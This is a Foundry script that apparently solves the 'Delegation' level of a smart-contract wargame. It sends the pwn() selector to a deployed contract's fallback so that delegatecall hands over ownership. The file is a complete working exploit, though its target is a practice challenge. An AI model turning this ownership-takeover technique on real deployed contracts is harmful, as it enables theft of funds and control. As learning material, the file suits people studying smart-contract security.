// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/level06.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TokenHack is Script
{
    function run() external
    {
        vm.startBroadcast(vm.envUint('PRIVATE_KEY'));

        bytes memory data = abi.encodeWithSelector(bytes4(keccak256("pwn()")));

        Delegation delegationInstance = Delegation(0x9555AFDF4E0c9DacDEd0BC234d8Ba6aCB990cC53);
        
        // Call the fallback function with the specific data
        (bool success, ) = address(delegationInstance).call(data);
        console.log("Fallback function status - ", success);
        vm.stopBroadcast();
    }
}